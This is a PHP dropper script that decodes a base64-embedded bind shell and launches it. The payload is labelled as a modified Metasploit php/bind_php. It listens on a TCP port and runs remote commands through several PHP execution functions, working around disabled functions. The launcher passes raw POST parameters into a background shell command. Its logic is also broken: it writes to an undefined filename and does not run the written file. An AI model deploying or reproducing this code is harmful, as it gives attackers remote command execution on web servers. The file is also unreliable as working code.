<?php
function exec_method($cmd) {
	$retval = true;
	ob_start(); 
	system($cmd); 
	$ret_exec=ob_get_contents(); 
	ob_end_clean(); 
	return $retval;
}

$php_bind = "IyEvdXNyL2Jpbi9waHAKPD9waHAJCi8qIApLbnVsbCdzIG1vZGlmaWVkIGBtc2ZwYXlsb2FkIHBo
cC9iaW5kX3BocCBSYAoqLwoKaWYgKCRhcmdjID09PSAzKSB7CgpAc2V0X3RpbWVfbGltaXQoMCk7
CkBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgCkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDAp
OwoJCiRkZj1AaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsKaWYoIWVtcHR5KCRkZikpewoJ
JGRmPXByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJGRmKTsKCSRkZj1leHBsb2RlKCcsJywg
JGRmKTsKCSRkZj1hcnJheV9tYXAoJ3RyaW0nLCAkZGYpOwp9ZWxzZXsKCSRkZj1hcnJheSgpOwp9
CgokcG9ydD0kYXJndlsyXTsKJGlwPSRhcmd2WzFdOwoKJHNvY2s9QHNvY2tldF9jcmVhdGUoQUZf
SU5FVCxTT0NLX1NUUkVBTSxTT0xfVENQKTsKJHJldD1Ac29ja2V0X2JpbmQoJHNvY2ssJGlwLCRw
b3J0KTsKJHJldD1Ac29ja2V0X2xpc3Rlbigkc29jayw1KTsKCiRtc2dzb2NrPUBzb2NrZXRfYWNj
ZXB0KCRzb2NrKTsKQHNvY2tldF9jbG9zZSgkc29jayk7Cgp3aGlsZShGQUxTRSE9PUBzb2NrZXRf
c2VsZWN0KCRyPWFycmF5KCRtc2dzb2NrKSwgJHc9TlVMTCwgJGU9TlVMTCwgTlVMTCkpCnsKCSRv
ID0gJyc7CgkkYz1Ac29ja2V0X3JlYWQoJG1zZ3NvY2ssMjA0OCxQSFBfTk9STUFMX1JFQUQpOwoJ
aWYoRkFMU0U9PT0kYyl7YnJlYWs7fQoJaWYoc3Vic3RyKCRjLDAsMykgPT0gJ2NkICcpewoJCWNo
ZGlyKHN1YnN0cigkYywzLC0xKSk7Cgl9IGVsc2UgaWYgKHN1YnN0cigkYywwLDQpID09ICdxdWl0
JyB8fCBzdWJzdHIoJGMsMCw0KSA9PSAnZXhpdCcpIHsKCQlicmVhazsKCX1lbHNlewoJCWlmIChG
QUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicgKSkgewoJCSRjPSRjLiIg
Mj4mMVxuIjsKCX0KCSRpc2M9J2lzX2NhbGxhYmxlJzsKCSRpbmE9J2luX2FycmF5JzsKCQkKCWlm
KCRpc2MoJ3N5c3RlbScpYW5kISRpbmEoJ3N5c3RlbScsJGRmKSl7CgkJb2Jfc3RhcnQoKTsKCQlz
eXN0ZW0oJGMpOwoJCSRvPW9iX2dldF9jb250ZW50cygpOwoJCW9iX2VuZF9jbGVhbigpOwoJfWVs
c2UgaWYoJGlzYygncGFzc3RocnUnKWFuZCEkaW5hKCdwYXNzdGhydScsJGRmKSl7CgkJb2Jfc3Rh
cnQoKTsKCQlwYXNzdGhydSgkYyk7CgkJJG89b2JfZ2V0X2NvbnRlbnRzKCk7CgkJb2JfZW5kX2Ns
ZWFuKCk7Cgl9ZWxzZSBpZigkaXNjKCdleGVjJylhbmQhJGluYSgnZXhlYycsJGRmKSl7CgkJJG89
YXJyYXkoKTsKCQlleGVjKCRjLCRvKTsKCQkkbz1qb2luKGNocigxMCksJG8pLmNocigxMCk7Cgl9
ZWxzZSBpZigkaXNjKCdwcm9jX29wZW4nKWFuZCEkaW5hKCdwcm9jX29wZW4nLCRkZikpewoJCSRo
YW5kbGU9cHJvY19vcGVuKCRjLGFycmF5KGFycmF5KHBpcGUsJ3InKSxhcnJheShwaXBlLCd3Jyks
YXJyYXkocGlwZSwndycpKSwkcGlwZXMpOwoJCSRvPU5VTEw7CgkJd2hpbGUoIWZlb2YoJHBpcGVz
WzFdKSl7CgkJCSRvLj1mcmVhZCgkcGlwZXNbMV0sMTAyNCk7CgkJfQoJCUBwcm9jX2Nsb3NlKCRo
YW5kbGUpOwoJfWVsc2UgaWYoJGlzYygncG9wZW4nKWFuZCEkaW5hKCdwb3BlbicsJGRmKSl7CgkJ
JGZwPXBvcGVuKCRjLCdyJyk7CgkJJG89TlVMTDsKCQlpZihpc19yZXNvdXJjZSgkZnApKXsKCQkJ
d2hpbGUoIWZlb2YoJGZwKSl7CgkJCQkkby49ZnJlYWQoJGZwLDEwMjQpOwoJCQl9CgkJfQoJCUBw
Y2xvc2UoJGZwKTsKCX1lbHNlIGlmKCRpc2MoJ3NoZWxsX2V4ZWMnKWFuZCEkaW5hKCdzaGVsbF9l
eGVjJywkZGYpKXsKCQkkbz1zaGVsbF9leGVjKCRjKTsKCX1lbHNlIHsKCQkkbz0wOwoJfQoJCQoJ
fQoJQHNvY2tldF93cml0ZSgkbXNnc29jaywkbyxzdHJsZW4oJG8pKTsKfQpAc29ja2V0X2Nsb3Nl
KCRtc2dzb2NrKTsKfSBlbHNlIHsKCWVjaG8gJ3VzYWdlOiAnIC4gJGFyZ3ZbMF0gLiAnIHBvcnQn
IC4gIlxuIjsKfQoKPz4K";


@$fh=fopen($uniqfn,"wb+");
@fwrite($fh,base64_decode($php_bind));
@fclose($fh);
$command = 'php '. $_POST['ip'] . ' ' . $_POST['port'] . ' > /dev/null &';
exec_method($command);	
?>